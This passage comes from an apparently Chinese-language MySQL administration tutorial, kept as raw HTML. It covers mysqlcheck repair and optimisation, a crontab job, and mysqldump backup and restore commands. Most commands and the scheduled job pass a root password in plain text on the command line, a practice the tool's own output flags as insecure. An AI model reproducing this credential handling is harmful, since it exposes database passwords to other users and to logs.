class="keyword">Table</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| book1 | <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`book1`</span> (</span><br><span class="line">&#xA0; <span class="string">`bTypeId`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0;&#xA0;<span class="string">`bName`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`price`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`publishing`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 |</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">alter</span> <span class="keyword">table</span> testdb.book1 <span class="keyword">engine</span> = MyISAM;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0&#xA0; Duplicates: 0&#xA0; Warnings: 0</span><br><span class="line"> </span><br><span class="line">mysql&gt; show create table testdb.book1;</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| Table | <span class="keyword">Create</span> <span class="keyword">Table</span> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| book1 | <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`book1`</span> (</span><br><span class="line">&#xA0; <span class="string">`bTypeId`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`bName`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`price`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`publishing`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 |</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; <span class="keyword">exit</span></span><br><span class="line">Bye</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -r testdb book1</span><br><span class="line">mysqlcheck: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">testdb.book1                                       OK</span><br><span class="line"> </span><br><span class="line">3:&#x4FEE;&#x590D;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5E93;</span><br><span class="line">[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -r testdb book1</span><br><span class="line">mysqlcheck: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">testdb.book1                                       OK&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# mysqlcheck -uroot -p  -r --databases testdb</span><br><span class="line">Enter password: </span><br><span class="line">testdb.book1                                       OK</span><br><span class="line">testdb.book2</span><br><span class="line">note     : The storage engine for the table doesn&apos;t support repair</span><br></pre></td></tr></tbody></table></figure><p>&#x6269;&#x5C55;&#xFF1A; &#x4FEE;&#x590D;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF0C;&#x5BB9;&#x6613;&#x6389;&#x5931;&#x6570;&#x636E;</p><pre><code>fsck -y -f /dev/sdbx</code></pre><p>4:  &#x68C0;&#x67E5;&#x4FEE;&#x590D;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -A -r</span><br><span class="line">book.book1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OK</span><br><span class="line">book2.book1</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">market.order</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">market.order1</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">market.user</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">mysql.columns_priv&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OK</span><br><span class="line">mysql.db&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OK</span><br><span class="line">mysql.engine_cost</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">mysql.event&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OK</span><br><span class="line">mysql.func&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OK</span><br><span class="line">mysql.gtid_executed</span><br><span class="line">Warning&#xA0; : Please do not modify the gtid_executed table. This is a mysql internal system table to store GTIDs for committed transactions. Modifying it can lead to an inconsistent GTID state.</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">mysql.help_category</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">mysql.help_keyword</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">mysql.help_relation</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">mysql.help_topic</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">mysql.innodb_table_stats</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">mysql.ndb_binlog_index&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OK</span><br><span class="line">mysql.plugin</span><br><span class="line">note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repair</span><br><span class="line">mysql.proc&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OK</span><br><span class="line">mysql.procs_priv&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OK</span><br><span class="line">mysql.proxies_priv&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OK</span><br><span class="line">mysql.server_cost</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53C2;&#x6570;-A &#x7B49;&#x4E8E;  &#x2013;all-databases  </p><p>5&#xFF1A;&#x6BCF;&#x5929;&#x5B9A;&#x65F6;&#x5BF9;mysql&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x4F18;&#x5316;</p><p>&#x4F7F;&#x7528;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"><span class="meta">#</span><span class="bash">0 1 * * * /usr/bin/mysqlcheck -A -o -r&#xA0; -u&#x4F60;&#x7684;&#x7528;&#x6237;&#x540D; -p&#x4F60;&#x7684;&#x5BC6;&#x7801; &gt; /dev/null 2&gt;&amp;1</span></span><br><span class="line"></span><br><span class="line">0 3 * * *&#xA0; /usr/bin/mysqlcheck -uroot -pJaking@vip.163.com -r -o -A &gt; /dev/null 2&gt;&amp;1 #&#x6BCF;&#x5929;3&#x70B9;&#x4F18;&#x5316;</span><br></pre></td></tr></tbody></table></figure><p></p><p>2&#xFF1A;MySQL&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;</p><p>1)MySQL&#x5907;&#x4EFD;&#x7684;&#x7C7B;&#x578B;<br>&#x6309;&#x7167;&#x5907;&#x4EFD;&#x65F6;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x5206;&#x4E3A;&#xFF1A;<br>Hot backup(&#x70ED;&#x5907;)  Cold Backup&#xFF08;&#x51B7;&#x5907;&#xFF09;Warm Backup&#xFF08;&#x6E29;&#x5907;&#xFF09;<br>Hot backup&#xFF1A;&#x70ED;&#x5907;&#x6307;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x884C;&#x4E2D;&#x76F4;&#x63A5;&#x5907;&#x4EFD;&#xFF0C;&#x5BF9;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;&#x6570;&#x636E;&#x5E93;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x5F71;&#x54CD;&#xFF0C;&#xFF08;Online Backup&#xFF09;&#x5B98;&#x65B9;&#x624B;&#x518C;&#x4E3A;&#x5728;&#x7EBF;&#x5907;&#x4EFD;<br>Cold Backup&#xFF1A;&#x51B7;&#x5907;&#x6307;&#x5728;&#x6570;&#x636E;&#x5E93;&#x505C;&#x6B62;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#xFF0C;(OfflineBackup) &#x5B98;&#x65B9;&#x624B;&#x518C;&#x79F0;&#x4E3A;&#x79BB;&#x7EBF;&#x5907;&#x4EFD;<br>Warm Backup&#xFF1A;&#x6E29;&#x5907;&#x6307;&#x5907;&#x4EFD;&#x540C;&#x6837;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x884C;&#x65F6;&#x8FDB;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4F1A;&#x5BF9;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x6709;&#x6240;&#x5F71;&#x54CD;&#xFF0C;&#x4F8B;&#x5982;&#x52A0;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x8BFB;&#x9501;&#x4EE5;&#x4FDD;&#x8BC1;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;</p><p>&#x6309;&#x7167;&#x5907;&#x4EFD;&#x540E;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF1A;</p><p>&#x903B;&#x8F91;&#x5907;&#x4EFD; &#x2013;&gt;<br>&#x6307;&#x5907;&#x4EFD;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x662F;&#x53EF;&#x8BFB;&#x7684;&#xFF0C;&#x901A;&#x5E38;&#x4E3A;&#x6587;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x5185;&#x5BB9;&#x4E00;&#x822C;&#x662F;SQL&#x8BED;&#x53E5;&#xFF0C;&#x6216;&#x8005;&#x662F;&#x8868;&#x5185;&#x7684;&#x5B9E;&#x9645;&#x6570;&#x636E;&#xFF0C;&#x5982;mysqldump&#x548C;SELECT * INTO OUTFILE&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4E00;&#x822C;&#x9002;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5347;&#x7EA7;&#x548C;&#x8FC1;&#x79FB;&#xFF0C;&#x6062;&#x590D;&#x65F6;&#x95F4;&#x8F83;&#x957F;</p><p>&#x88F8;&#x6587;&#x4EF6;&#x5907;&#x4EFD;&#x2013;&gt;<br>&#x62F7;&#x8D1D;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7269;&#x7406;&#x6587;&#x4EF6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x65E2;&#x53EF;&#x4EE5;&#x5904;&#x4E8E;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#xFF08;mysqlhotcopy &#x3001;ibbackup&#x3001;xtrabackup&#x8FD9;&#x7C7B;&#x5DE5;&#x5177;&#xFF09;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5904;&#x4E8E;&#x505C;&#x6B62;&#x72B6;&#x6001;&#xFF0C;&#x6062;&#x590D;&#x65F6;&#x95F4;&#x8F83;&#x77ED;&#x3002;</p><p>&#x6309;&#x7167;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5185;&#x5BB9;&#x6765;&#x5206;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#xFF1A;<br>&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#xFF1A;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x5B8C;&#x6574;&#x7684;&#x5907;&#x4EFD;<br>&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF1A;&#x5728;&#x4E0A;&#x4E00;&#x6B21;&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x5BF9;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#xFF08;xtrabackup&#xFF09;<br>&#x65E5;&#x5FD7;&#x5907;&#x4EFD;&#xFF1A;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x5907;&#x4EFD;&#xFF0C;&#x4E3B;&#x4ECE;&#x590D;&#x5236;</p><p>2)&#x903B;&#x8F91;&#x5907;&#x4EFD;&#x5DE5;&#x5177;mysqldump<br>&#x4F7F;&#x7528;&#x7684;&#x65F6;&#x5019;MySQL&#x5F53;&#x8981;&#x5BFC;&#x5165;&#x6216;&#x8005;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x5E93;&#x7684;&#x65F6;&#x5019;,&#x7528;PHPMYADMIN&#x751A;&#x81F3;MySQL Administrator&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x90FD;&#x4F1A;&#x529B;&#x4E0D;&#x4ECE;&#x5FC3;,&#x8FD9;&#x65F6;&#x53EA;&#x80FD;&#x4F7F;&#x7528;MySQL&#x6240;&#x63D0;&#x4F9B;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;mysqldump&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x6062;&#x590D;&#xFF1B;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#xFF0C;&#x53EF;&#x652F;&#x6301;MyISAM,InnoDB</p><p>MySQL&#x6570;&#x636E;&#x7684;&#x5BFC;&#x51FA;&#x548C;&#x5BFC;&#x5165;&#x5DE5;&#x5177;: mysqldump</p><p>&#x5BFC;&#x51FA;&#x6570;&#x636E;&#xFF1A;<br>&#x8BED;&#x6CD5;&#xFF1A; mysqldump [TMPIONS] database [tables] &gt;&#x5BFC;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x540D;.sql</p><p>A:&#x5BFC;&#x51FA;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -pJaking@vip.163.com -A &gt;all.sql</span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com --all-databases &gt;all2.sql</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53C2;&#x6570;-A&#x4EE3;&#x8868;&#x6240;&#x6709;&#xFF0C;&#x7B49;&#x540C;&#x4E8E; &#x2013;all-databases</p><p>B:&#x5BFC;&#x51FA;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x5E93;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u &#x7528;&#x6237;&#x540D; -p&#x5BC6;&#x7801; &#x6570;&#x636E;&#x5E93;&#x540D; &gt; &#x5BFC;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x540D;.sql&#xA0; </span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com testdb &gt; testdb.sql</span><br></pre></td></tr></tbody></table></figure><p></p><p>C:&#x5BFC;&#x51FA;&#x5355;&#x5F20;&#x8868;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -pJaking@vip.163.com testdb book1 &gt; testdb.book1.sql&#xA0; #&#x5BFC;&#x51FA;testdb&#x5E93;book1&#x8868;</span><br></pre></td></tr></tbody></table></figure><p></p><p>D:&#x5BFC;&#x51FA;&#x5E93;&#x7684;&#x8868;&#x7ED3;&#x6784;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -pJaking@vip.163.com -d testdb &gt; testdbtable.sql&#xA0; #&#x53EA;&#x5BFC;&#x51FA;testdb&#x5E93;&#x7684;&#x8868;&#x7ED3;&#x6784;</span><br></pre></td></tr></tbody></table></figure><p></p><p>E:&#x53EA;&#x5BFC;&#x51FA;&#x6570;&#x636E;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -pJaking@vip.163.com -t testdb &gt; testdbdata.sql&#xA0; #&#x53EA;&#x5BFC;&#x51FA;testdb&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;</span><br></pre></td></tr></tbody></table></figure><p></p><p>F:&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x5E93;&#x7684;&#x521B;&#x5EFA;&#x8BED;&#x53E5;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -pJaking@vip.163.com -B testdb &gt; testdb.sql  #&#x751F;&#x6210;&#x5EFA;&#x5E93;&#x8BED;&#x53E5;</span><br><span class="line">mysql -uroot -pJaking@vip.163.com &lt; testdb.sql  #&#x5BFC;&#x5165;&#x4E0D;&#x7528;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x540D;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5BFC;&#x5165;&#x6570;&#x636E;&#xFF1A;<br>A&#xFF1A;&#x5BFC;&#x5165;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;</p><pre><code>mysql -uroot -pJaking@vip.163.com &lt; all.sql</code></pre><p>B&#xFF1A;&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pJaking@vip.163.com testdb &lt; testdb.sql&#xA0; 